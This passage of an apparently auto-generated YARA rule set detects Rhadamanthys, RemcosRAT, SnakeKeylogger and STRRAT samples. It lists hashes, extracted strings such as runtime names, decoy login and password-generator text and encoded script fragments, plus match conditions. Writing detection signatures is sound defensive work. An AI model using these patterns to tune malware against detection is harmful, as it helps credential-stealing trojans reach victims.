      hash6 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash7 = "faed38b89c09070971844291bfefe437592451789e389ab38e3396ff84e49159"
   strings:
      $s1 = "runtime.(*gcControllerState).commit" fullword ascii /* score: '14.00'*/
      $s2 = "runtime.initLongPathSupport" fullword ascii /* score: '13.00'*/
      $s3 = "runtime.(*sweepLocker).tryAcquire" fullword ascii /* score: '12.00'*/
      $s4 = "runtime.(*sweepLocked).sweep" fullword ascii /* score: '12.00'*/
      $s5 = "runtime.printArgs" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.mstart0" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.printArgs.func2" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.winthrow" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.gcResetMarkState.func1" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.osyield_no_g" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.printArgs.func1" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.forEachG" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.forEachGRace" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.sigpanic0" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.unreachableMethod" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__7bfcbc53d4c02bdedbc3a63219e5ed9f_imphash__Rhadamanthys_signature__acb97f311176c6761732879ff5096c34__110 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, Rhadamanthys(signature)_d5834be2544a02797750dc7759c325d4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_e1286f2989f2b70b354fe5e33036a7bb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a5e075e870c492583a67a818932e5c48d879db6d343ac6c837306222e444b8d7"
      hash2 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash3 = "a18e90d3f747ff22bdd705536ec38718b3611ae4ecd74fee73509faf5b708ec7"
      hash4 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash5 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
      hash6 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash7 = "e1eb24ee7b92716ab4ca09309e4dc4ce5470f832145d00f18a2eda2dcd595384"
   strings:
      $s1 = "BResolveGenericVirtualMethodTargetBGetStringFromMemoryInNativeFormatDGetRuntimeFieldHandleForComponents@" fullword ascii /* score: '20.00'*/
      $s2 = "RTryGetStaticRuntimeMethodHandleComponentsRGetMethodDescForStaticRuntimeMethodHandle@" fullword ascii /* score: '15.00'*/
      $s3 = "2RuntimeMethodKeyHashtable" fullword ascii /* score: '13.00'*/
      $s4 = "RFunctionPointerRuntimeTypeHandleHashtable,GenericTypeInstanceKey" fullword ascii /* score: '13.00'*/
      $s5 = "NDynamicGenericMethodComponentsHashtableDMethodDescBasedGenericMethodLookup" fullword ascii /* score: '13.00'*/
      $s6 = "tRuntimeTypeHandleToParameterTypeRuntimeTypeHandleHashtable,FunctionPointerTypeKey" fullword ascii /* score: '13.00'*/
      $s7 = "<InstantiatedMethodKeyHashtable" fullword ascii /* score: '10.00'*/
      $s8 = "8DynamicGenericTypesHashtable*GenericTypeLookupData*LazyDictionaryContext" fullword ascii /* score: '10.00'*/
      $s9 = "*RuntimeFieldHandleKey" fullword ascii /* score: '10.00'*/
      $s10 = "JMethodForInstantiatedTypeKeyHashtable" fullword ascii /* score: '10.00'*/
      $s11 = "*ArrayTypeKeyHashtable" fullword ascii /* score: '10.00'*/
      $s12 = ",RuntimeMethodHandleKey" fullword ascii /* score: '10.00'*/
      $s13 = "8InstantiatedTypeKeyHashtable" fullword ascii /* score: '10.00'*/
      $s14 = "<DynamicGenericMethodsHashtable.GenericMethodLookupData" fullword ascii /* score: '10.00'*/
      $s15 = "HFieldForInstantiatedTypeKeyHashtable" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 13000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphas_111 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, Rhadamanthys(signature)_d5834be2544a02797750dc7759c325d4(imphash).exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash3 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash4 = "a18e90d3f747ff22bdd705536ec38718b3611ae4ecd74fee73509faf5b708ec7"
      hash5 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash6 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = " NtProcessManager" fullword ascii /* score: '15.00'*/
      $s2 = " ExecutionContext(IOCompletionCallback" fullword ascii /* score: '15.00'*/
      $s3 = "Switch.System.Runtime.Serialization.SerializationGuard" fullword wide /* score: '14.00'*/
      $s4 = "BindHandle for ThreadPool failed on this handle" fullword wide /* score: '13.00'*/
      $s5 = "RGetNativeOverlappedStateWindowsThreadPool" fullword ascii /* score: '12.00'*/
      $s6 = "GetDecoder@" fullword ascii /* score: '11.00'*/
      $s7 = "An action was attempted during deserialization that could lead to a security vulnerability. The action has been aborted. To allo" wide /* score: '11.00'*/
      $s8 = "DEnsureThreadPoolBindingInitialized*InitThreadPoolBinding" fullword ascii /* score: '10.00'*/
      $s9 = ":get_DeserializationInProgress@ThrowIfDeserializationInProgress" fullword ascii /* score: '9.00'*/
      $s10 = "get_OwnsHandle" fullword ascii /* score: '9.00'*/
      $s11 = "\"GetOverlappedData" fullword ascii /* score: '9.00'*/
      $s12 = "@GetNativeOverlappedForSyncHandle" fullword ascii /* score: '9.00'*/
      $s13 = "*GetBytesForSmallInput,GetStringForSmallInput\\<GetMaxByteCount>g__ThrowArgumentException|7_0\\<GetMaxCharCount>g__ThrowArgument" ascii /* score: '9.00'*/
      $s14 = "\"GetLeadByteRanges" fullword ascii /* score: '9.00'*/
      $s15 = "GetFileOptions@" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__Rhadamanthys_signature__198098fa616880c50e48e8c22b284156_imp_112 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash3 = "a5e075e870c492583a67a818932e5c48d879db6d343ac6c837306222e444b8d7"
      hash4 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
   strings:
      $s1 = "DDetermineThreadPoolThreadTimeoutMs.get_HasForcedMinThreads.get_HasForcedMaxThreads4GetIOCompletionPollerCount,CreateIOCompletio" ascii /* score: '21.00'*/
      $s2 = "DDetermineThreadPoolThreadTimeoutMs.get_HasForcedMinThreads.get_HasForcedMaxThreads4GetIOCompletionPollerCount,CreateIOCompletio" ascii /* score: '18.00'*/
      $s3 = "System.Threading.ThreadPool.ProcessorsPerIOPollerThrea" fullword wide /* score: '18.00'*/
      $s4 = "Failed to create an IO completion port. HR:" fullword wide /* score: '13.00'*/
      $s5 = "System.Diagnostics.Eventing.FrameworkEventSourc" fullword wide /* score: '13.00'*/
      $s6 = "GetInt32Config" fullword ascii /* score: '12.00'*/
      $s7 = "&GetSystemDirectoryW" fullword ascii /* score: '12.00'*/
      $s8 = "&AwakeWaiterIfNeeded2GetWaiterForCurrentThread" fullword ascii /* score: '12.00'*/
      $s9 = "ExitSlowPath2get_IsHeldByCurrentThread" fullword ascii /* score: '12.00'*/
      $s10 = "$PortableThreadPool" fullword ascii /* score: '10.00'*/
      $s11 = "DOTNET_SYSTEM_NET_SOCKETS_INLINE_COMPLETION" fullword wide /* score: '10.00'*/
      $s12 = "System.Threading.Tasks.TplEventSourc" fullword wide /* score: '10.00'*/
      $s13 = "System.Threading.ThreadPool.MaxThread" fullword wide /* score: '10.00'*/
      $s14 = "System.Threading.ThreadPool.MinThread" fullword wide /* score: '10.00'*/
      $s15 = "System.Threading.ThreadPool.ThreadTimeoutM" fullword wide /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 20000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__acb97f311176c6761732879ff5096c34_imphash__SnakeKeylogger_signature__636312a5ec1f8b9f790598a6e097c5a_113 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash2 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash3 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
      hash4 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
   strings:
      $s1 = "System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '27.00'*/
      $s2 = ".get_ShouldLogInEventLog@" fullword ascii /* score: '20.00'*/
      $s3 = "QueueTask(TryExecuteTaskInline&GetAllocationLength" fullword ascii /* score: '19.00'*/
      $s4 = "$ExecuteEntryUnsafe@" fullword ascii /* score: '18.00'*/
      $s5 = "VExecuteEntryCancellationRequestedOrCanceled,ExecuteWithThreadLocal@" fullword ascii /* score: '17.00'*/
      $s6 = "$GetRuntimeTypeInfo" fullword ascii /* score: '12.00'*/
      $s7 = "Enter4EnterAndGetCurrentThreadId@" fullword ascii /* score: '12.00'*/
      $s8 = "z<GetRuntimeTypeInfo>g__GetConstructedGenericTypeForHandle|2_0t<GetRuntimeTypeInfo>g__GetFunctionPointerTypeForHandle|2_1" fullword ascii /* score: '12.00'*/
      $s9 = "ComparerHelpers.EqualityComparerHelpers" fullword ascii /* score: '10.00'*/
      $s10 = "timeout.yieldedBeforeCompletion" fullword ascii /* score: '10.00'*/
      $s11 = ":get_FormattedInvalidCultureIdPInternalGetAbbreviatedDayOfWeekNamesCoreHInternalGetAbbreviatedMonthNamesCore@" fullword ascii /* score: '9.00'*/
      $s12 = "get_IsGCPointer$get_UnderlyingType0get_HasStaticConstructor\"GetTypeDefinition" fullword ascii /* score: '9.00'*/
      $s13 = "<<GetTransitiveNamespaces>d__19" fullword ascii /* score: '9.00'*/
      $s14 = ".get_AbbreviatedDayNames2get_AbbreviatedMonthNames(get_DecimalSeparator" fullword ascii /* score: '9.00'*/
      $s15 = "B<CoreGetDeclaredNestedTypes>d__61" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 13000KB and ( 8 of them )
      ) or ( all of them )
}

rule _STRRAT_signature__STRRAT_signature__20c90a2d_114 {
   meta:
      description = "_subset_batch - from files STRRAT(signature).js, STRRAT(signature)_20c90a2d.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "26616e50b172813a20f873380129a57fe17d78c9b139dc511e42ffa78f3cbcd4"
      hash2 = "20c90a2dc95ae965457ca1b792f97dd8a755b75df6edad3d39dcf540be6306af"
   strings:
      $s1 = "g0NVx4NzJceDM0XHg2QVx4MzRceDUzXHg2Qlx4NEFceDU0XHgzMFx4NzZceDM0XHg3Mlx4NkZceDUyXHg2RVx4NEFceDQ4XHg3OFx4NTBceDc3XHg3Nlx4NjNceDZDXH" ascii /* score: '11.00'*/
      $s2 = "g0Mlx4NzZceDZDXHg3QVx4NEJceDU1XHg0NVx4NjZceDdBXHg2OVx4NDZceDUyXHg0Nlx4NkNceDQ1XHg1QVx4NjVceDRBXHg2RFx4NDNceDMxXHg2OVx4NkFceDZGXH" ascii /* score: '11.00'*/
      $s3 = "g1NFx4NTVceDRGXHg0OFx4NzRceDcxXHg0N1x4NTBceDREXHg1MVx4NzdceDM0XHg1Nlx4NzZceDZBXHg0NFx4NzNceDMzXHg3NFx4NDZceDY2XHg3QVx4NjlceDVBXH" ascii /* score: '11.00'*/
      $s4 = "g2RVx4NzlceDRGXHg0OFx4NERceDQyXHg2RFx4MkJceDM4XHg3OFx4NzlceDM1XHgzOVx4NzlceDc5XHgzNVx4NDZceDM0XHg3NVx4NEVceDc3XHg1M1x4NkNceDY4XH" ascii /* score: '11.00'*/
      $s5 = "g0Q1x4NzFceDUzXHg3NFx4MkZceDM3XHg2Rlx4MzdceDcxXHgzNlx4NDRceDc4XHg2OVx4N0FceDZBXHg0RVx4NkFceDc5XHgzOFx4NEFceDMxXHg3QVx4MzlceDcyXH" ascii /* score: '11.00'*/
      $s6 = "gyRlx4NDVceDcyXHg0M1x4NzJceDc5XHg1OFx4MzhceDUyXHg3M1x4NEJceDcyXHg0NVx4NkVceDM0XHg3Mlx4MzRceDU4XHg2M1x4NTNceDY2XHg2OVx4MkZceDY4XH" ascii /* score: '11.00'*/
      $s7 = "g3MVx4NzFceDZEXHg1QVx4NjdceDMyXHg2OVx4NzhceDREXHg1QVx4NTJceDRDXHgzNVx4NTRceDREXHg2OFx4NDZceDQ1XHgyRlx4NkNceDREXHg3OVx4NjdceDMyXH" ascii /* score: '11.00'*/
      $s8 = "g0Nlx4NjdceDc2XHgzM1x4NjhceDRGXHg2NVx4NTZceDUzXHg0OVx4NjRceDQ4XHg3Nlx4NjFceDMyXHg3OFx4NjNceDQzXHg3Mlx4NzlceDY4XHg3Nlx4NkFceDY5XH" ascii /* score: '11.00'*/
      $s9 = "g1OVx4NTdceDZFXHg3Mlx4NEZceDU1XHg1MFx4NDdceDMxXHg1Nlx4NjdceDQ4XHgzOFx4NDJceDU1XHg0NVx4NzNceDQ4XHg0M1x4NDRceDczXHg1QVx4NjVceDU2XH" ascii /* score: '11.00'*/
      $s10 = "g2Mlx4NzlceDM5XHg3NVx4NjJceDZEXHg1Mlx4NkRceDVBXHg0N1x4NUFceDZEXHg1QVx4NDNceDM1XHg2QVx4NjJceDQ3XHg0Nlx4N0FceDYzXHgzMVx4NDJceDRDXH" ascii /* score: '11.00'*/
      $s11 = "g2NVx4NjdceDUzXHg2Qlx4NzNceDc4XHgzOFx4NjNceDVBXHg0M1x4NkFceDRBXHg0Rlx4NDNceDc1XHg1Mlx4NDZceDJGXHg0Q1x4NzBceDczXHgzOVx4NEZceDZGXH" ascii /* score: '11.00'*/
      $s12 = "g1MVx4NkJceDYyXHg1Nlx4NDhceDY0XHgzMFx4NzZceDU5XHg1NFx4MzBceDc0XHgzMFx4NThceDM0XHg0NFx4MkZceDM4XHg0OFx4NzdceDQ0XHg1Nlx4NDJceDRDXH" ascii /* score: '11.00'*/
      $s13 = "g1M1x4NzhceDYzXHgzNVx4NTBceDU5XHgzMFx4MkJceDU4XHg3OFx4MzlceDVBXHgzMVx4NDVceDQ5XHgzM1x4NkVceDU2XHg2RFx4MzhceDRBXHg1N1x4MzJceDZFXH" ascii /* score: '11.00'*/
      $s14 = "g2MVx4NjhceDM4XHg2M1x4NjlceDMxXHg2NFx4NEVceDU3XHgzN1x4NTVceDMzXHg2OVx4MkJceDdBXHg2OFx4NjJceDdBXHg1QVx4NkJceDRFXHg3Mlx4NzlceDQyXH" ascii /* score: '11.00'*/
      $s15 = "g1Nlx4MzVceDZGXHgzOVx4NkJceDZEXHgzMlx4NkJceDRDXHgyQlx4NTRceDY3XHg3QVx4MzdceDc2XHg1QVx4NkFceDU1XHg0Nlx4NzRceDQ0XHgzOVx4NTJceDQ1XH" ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x7453 and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__96a0774f_SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c_115 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_96a0774f.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_593b2dd3.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e69f506f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "96a0774fc25c036056be449766e6829678457f642381dbbd99525f4866e55f70"
      hash2 = "593b2dd3e7a1806f5f97341c297792834c28f57fb95e33c4528c733a9fed4c73"
      hash3 = "e69f506fb5549fac407a4e5e7c3400e73adfe40329a262771d7bae9a5ab1ba17"
   strings:
      $s1 = "SELECT * FROM tbl_users WHERE username= '" fullword wide /* score: '16.00'*/
      $s2 = "Back to LOGIN" fullword wide /* score: '15.00'*/
      $s3 = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=db_users.mdb" fullword wide /* score: '15.00'*/
      $s4 = "frmLogin" fullword wide /* score: '15.00'*/
      $s5 = "Login_And_Register_Form.Properties.Resources" fullword wide /* score: '15.00'*/
      $s6 = "Login_And_Register_Form" fullword wide /* score: '15.00'*/
      $s7 = "Username and Password fields are empty" fullword wide /* score: '12.00'*/
      $s8 = "INSERT INTO tbl_users VALUES ('" fullword wide /* score: '12.00'*/
      $s9 = "Passwords does not match, please re-enter the password" fullword wide /* score: '12.00'*/
      $s10 = "chckbxPassword" fullword wide /* score: '12.00'*/
      $s11 = "' and password= '" fullword wide /* score: '12.00'*/
      $s12 = "Invalid username or password, please try again" fullword wide /* score: '12.00'*/
      $s13 = "Already Have An Account" fullword wide /* score: '10.00'*/
      $s14 = "Get Started" fullword wide /* score: '9.00'*/
      $s15 = "btnequal" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphas_116 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash3 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash4 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
      hash5 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash6 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "GetOSVersion&get_SystemDirectory4GetEnvironmentVariableCoreLGetEnvironmentVariableCore_NoArrayPool" fullword ascii /* score: '15.00'*/
      $s2 = "\"get_VersionString$IsOSVersionAtLeast" fullword ascii /* score: '12.00'*/
      $s3 = "RtlGetVersionEx" fullword ascii /* score: '12.00'*/
      $s4 = "@<RtlGetVersion>g____PInvoke|22_0" fullword ascii /* score: '12.00'*/
      $s5 = ".SystemTimeProviderTimer$SystemTimeProvider" fullword ascii /* score: '11.00'*/
      $s6 = "&FinishContinuations RunContinuations4RunOrQueueCompletionAction@" fullword ascii /* score: '10.00'*/
      $s7 = "get_TickCount64" fullword ascii /* score: '9.00'*/
      $s8 = "get_TimeOfDay@" fullword ascii /* score: '9.00'*/
      $s9 = "$RhGetGcTotalMemory\"RhStartNoGCRegion" fullword ascii /* score: '9.00'*/
      $s10 = "Versioning" fullword ascii /* score: '9.00'*/
      $s11 = "OSVersion's call to GetVersionEx failed" fullword wide /* score: '8.00'*/
      $s12 = "platfor" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__fb51ffcf_SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c_117 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fb51ffcf.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_10f246e9.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_944c9457.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f67354f2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fb51ffcffd134849ebc6114eacc45a0bd9f2430188fd33064217df5b4cd41508"
      hash2 = "10f246e9a23f84a9e80787e654d3f5612eaded3b992ccaa7a92a94ce8676e40f"
      hash3 = "944c94577ed913dad804faa6e0a51c10ec26780e63b8852c92c64f23919a4848"
      hash4 = "f67354f208b9b7ea9e45262b27221c5862c73503d92139051a88c0479fc04cda"
   strings:
      $s1 = "Error generating password: " fullword wide /* score: '19.00'*/
      $s2 = "Password length must be between 4 and 128 characters." fullword wide /* score: '12.00'*/
      $s3 = "No character types selected for password generation." fullword wide /* score: '12.00'*/
      $s4 = "Password copied to clipboard!" fullword wide /* score: '12.00'*/
      $s5 = "Password Options" fullword wide /* score: '12.00'*/
      $s6 = "Enter characters to use in password" fullword wide /* score: '12.00'*/
      $s7 = "A secure password generator for Windows." fullword wide /* score: '12.00'*/
      $s8 = "Features customizable length, character types, and advanced options for creating strong passwords." fullword wide /* score: '12.00'*/
      $s9 = "About Password Generator" fullword wide /* score: '12.00'*/
      $s10 = "PassGenerator.Forms.SettingsForm.resources" fullword ascii /* score: '10.00'*/
      $s11 = "PassGenerator.Properties.Resources.resources" fullword ascii /* score: '10.00'*/
      $s12 = "PassGenerator.Forms.AboutForm.resources" fullword ascii /* score: '10.00'*/
      $s13 = "PassGenerator.Forms.MainForm.resources" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphash__Rhadamanthys_signature__acb97f311176c6761732879ff5096c34_imp_118 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash2 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash3 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash4 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
      hash5 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
      hash6 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash7 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "BTransitionToCancellationRequested.ExecuteCallbackHandlers" fullword ascii /* score: '21.00'*/
      $s2 = "Decoded string is not a valid IDN name" fullword wide /* score: '18.00'*/
      $s3 = "Invalid IDN encoded string" fullword wide /* score: '16.00'*/
      $s4 = "KeyEquals@" fullword ascii /* score: '12.00'*/
      $s5 = "Hashtable insert failed. Load factor too high. The most common cause is multiple threads writing to the Hashtable simultaneously" wide /* score: '12.00'*/
      $s6 = "PunycodeDecode" fullword ascii /* score: '11.00'*/
      $s7 = "Item has already been added. Key in dictionary: '{0}'  Key being added: '{1}" fullword wide /* score: '10.00'*/
      $s8 = "&GetUnicodeInvariant" fullword ascii /* score: '9.00'*/
      $s9 = "get_NlsFlags$ThrowForZeroLength" fullword ascii /* score: '9.00'*/
      $s10 = "GetUnicode\"GetAsciiInvariant(ValidateStd3AndAscii" fullword ascii /* score: '9.00'*/
      $s11 = "\"IcuGetUnicodeCore@" fullword ascii /* score: '9.00'*/
      $s12 = "IcuGetAsciiCore@" fullword ascii /* score: '9.00'*/
      $s13 = "NlsGetAsciiCore\"NlsGetUnicodeCore" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__7bfcbc53d4c02bdedbc3a63219e5ed9f_imphash__Rhadamanthys_signature__d5834be2544a02797750dc7759c325d4__119 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_d5834be2544a02797750dc7759c325d4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_e1286f2989f2b70b354fe5e33036a7bb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a5e075e870c492583a67a818932e5c48d879db6d343ac6c837306222e444b8d7"
      hash2 = "a18e90d3f747ff22bdd705536ec38718b3611ae4ecd74fee73509faf5b708ec7"
      hash3 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash4 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
      hash5 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash6 = "e1eb24ee7b92716ab4ca09309e4dc4ce5470f832145d00f18a2eda2dcd595384"
   strings:
      $s1 = "*ComputePublicKeyToken" fullword ascii /* score: '16.00'*/
      $s2 = "2InitializeExecutionDomain" fullword ascii /* score: '16.00'*/
      $s3 = "6TryGetTypeTemplate_Internal" fullword ascii /* score: '16.00'*/
      $s4 = "\"ProcessFinalizers" fullword ascii /* score: '15.00'*/
      $s5 = "2GetStructUnsafeStructSize<GetForwardDelegateCreationStub" fullword ascii /* score: '14.00'*/
      $s6 = "(GetRuntimeTypeHandle" fullword ascii /* score: '12.00'*/
